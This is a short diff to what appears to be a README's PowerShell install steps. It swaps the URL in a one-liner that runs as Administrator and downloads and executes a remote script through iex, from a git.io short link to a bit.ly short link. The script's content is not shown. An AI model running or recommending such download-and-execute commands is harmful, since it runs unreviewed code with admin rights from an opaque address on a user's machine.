@@ -40,6 +40,6 @@
 1. Open Windows Terminal/Powershell (as Adminstrator)
 2. Paste the string below into Windows Terminal/Powershell.
 ```
-iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JDJTZ'))
+iex ((New-Object System.Net.WebClient).DownloadString('https://bit.ly/3qB9iG4'))
 ```
 
